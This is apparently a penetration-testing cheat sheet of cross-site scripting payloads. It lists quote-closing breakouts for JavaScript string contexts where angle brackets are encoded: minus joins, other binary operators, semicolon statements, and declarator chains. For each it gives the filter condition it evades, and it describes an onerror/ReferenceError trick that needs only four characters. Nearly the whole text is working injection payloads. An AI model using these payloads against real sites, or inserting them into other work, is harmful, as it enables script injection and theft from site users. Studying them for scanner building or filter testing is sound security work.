1. XSS into JavaScript String with Angle Brackets Encoded (Single Quote)
- Payload: '-alert(1)-'
- Condition: Input is reflected inside a JavaScript string context where angle brackets (< >) are encoded
- Case: Angle brackets are encoded but single quotes and other characters are not filtered
- Output: <script>var x=''; alert(1); ''</script>

---

2. XSS into JavaScript String with Angle Brackets Encoded (Double Quote)
- Payload: "-alert(1)-"
- Condition: Input is reflected inside a JavaScript string context where angle brackets (< >) are encoded
- Case: Angle brackets are encoded but double quotes and other characters are not filtered
- Output: <script>var x=""; alert(1); ""</script>

---

3. Operator-Family Breakouts when the Classic Minus Join is Filtered
- Payload: '+alert(1)+'  '/alert(1)/'  '%alert(1)%'  '*alert(1)*'  '||alert(1)||'  '|alert(1)|'  '^alert(1)^'  '&alert(1)&'  '**alert(1)**'  '!=alert(1)!='  '==alert(1)=='  ',alert(1),'  ' in alert(1) in '  ' instanceof alert(1) instanceof '
- Condition: Quote survives, but `-` (or another join operator) is stripped/transformed. Any binary expression join evaluates its operands, so every surviving operator is an equivalent breakout: `var q='' OP alert(1) OP ''`
- Case: Emit each `{quote} OP fn OP {quote}` variant gated on the chars it needs — `/` requires slash survival, `%` requires percent sequences unmangled (else it becomes %25), `in`/`instanceof` require literal spaces, `<`/`>` require angle brackets, `&&`/`??`/`?:` are useless because the `''` prefix is falsy and their RHS never evaluates. `,` works in expression position (e.g. `foo('INJ')`) but shadows in `var` declarations. `in`/`instanceof` raise TypeError AFTER the call fires — the dialog still proves execution.
- Output: <script>var q=''||alert(1)||''</script>

---

4. Statement Breakouts: `';fn;'`
- Payload: ';alert(1);'
- Condition: Quote and `;` survive. `';fn;'` closes the string, runs the statement, and lets the trailing `'` re-open a harmless `''` literal — no comment needed.
- Case: Use when expression joins are all filtered but `;` is not, or when the sink sits inside a construct where a bare expression cannot close cleanly. Unlike operator joins, statement forms also accept `throw`-style and `;`-containing function bodies since they occupy statement position.
- Output: <script>var q='';alert(1);''</script>

---

5. Declarator-Chain Breakouts: `',w=fn,z='` and `',w=self.onerror=fn,t=undef,z='`
- Payload: ',w=alert(1),z='  or  ',w=self.onerror=alert,t=undefined_variable,z='
- Condition: Bare statement context (`var q='…'`, `x='…'` — structural closer is just the quote). `,` is a *declarator separator* here, not the comma operator, so `',fn,'` yields an invalid binding target — wrap the call in a declarator instead.
- Case 1 (call form survives): `var q='',w=alert(1),z=''` — `w=` evaluates `alert(1)` during init; `z='` swallows the sink's trailing quote into a final `''` declarator.
- Case 2 (parens/backticks/`;`/`+`/`-` all stripped): `var q='',w=self.onerror=alert,t=undefined_variable,z=''` — `w=` assigns the handler, `t=` evaluates an undefined identifier → ReferenceError → `onerror` → `alert(msg)`. Verified in Chromium: `FIRED: Uncaught ReferenceError: undefined_variable is not defined`. The only characters needed are `'` `,` `=` `.`.
- Output: <script>var q='',w=self.onerror=alert,t=undefined_variable,z=''</script>